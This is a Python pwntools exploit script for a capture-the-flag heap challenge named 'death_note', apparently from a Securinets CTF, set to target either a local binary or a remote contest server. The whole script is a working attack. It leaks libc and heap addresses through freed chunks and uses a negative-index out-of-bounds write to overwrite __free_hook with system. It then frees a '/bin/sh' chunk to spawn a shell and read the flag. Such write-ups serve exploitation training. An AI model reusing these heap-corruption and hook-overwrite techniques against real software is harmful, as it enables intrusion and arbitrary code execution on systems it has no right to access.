#!/usr/bin/python3

from pwn import *
import sys

BIN = "./death_note"
LIB = "./libc.so.6"

e = ELF(BIN)
l = ELF(LIB)

if len(sys.argv) > 1:
    r = remote('bin.q21.ctfsecurinets.com', 1337)
else:
    r = process('./D', env={"LD_PRELOAD": LIB})

def add_n(size):
    r.sendafter('5- Exit', '1')
    r.sendafter('Provide note size:', str(size))

def select_t(idx, name):
    r.sendafter('5- Exit', '2')
    r.sendafter('Provide note index: ', str(idx))
    r.sendafter('Name: ', name)

def kill_n(idx):
    r.sendafter('5- Exit', '3')
    r.sendafter('Provide note index: ', str(idx))

def view_t(idx):
    r.sendafter('5- Exit', '4')
    r.sendafter('Provide note index: ', str(idx))

# put a chunk into tcache
add_n(0x20)
kill_n(0)

print('1')
for i in range(9): # 0-8
    add_n(0xf0)

print('2')
for i in range(7): # 0-6
    kill_n(i)

kill_n(7) # 7

print('3')
for i in range(8): # 0-7
    add_n(0xf0)

select_t(7, b'QQQQQQQQ')
view_t(7)
r.recvuntil(b'Q'*8)
libc = u64(r.recv(6) + b'\x00\x00') - 0x3ebca0
free_hook = libc + 0x3ed8e8 - 8 # -8 for /bin/sh
system = libc + 0x04f4e0

view_t(0)
heap = u64(r.recv(6) + b'\x00\x00') - 0x7f0

info(f"""
[*] libc = {hex(libc)}
[*] heap = {hex(heap)}
""")

select_t(4294967231, p64(free_hook) + b'Q'*0x8) # -65
for i in range(4): # 0-3
    kill_n(i)

add_n(0x20) # 0
add_n(0x20) # 1

select_t(1, b"/bin/sh\x00" + p64(system))

print('4')
kill_n(1)

r.sendline('cat flag')
r.interactive()
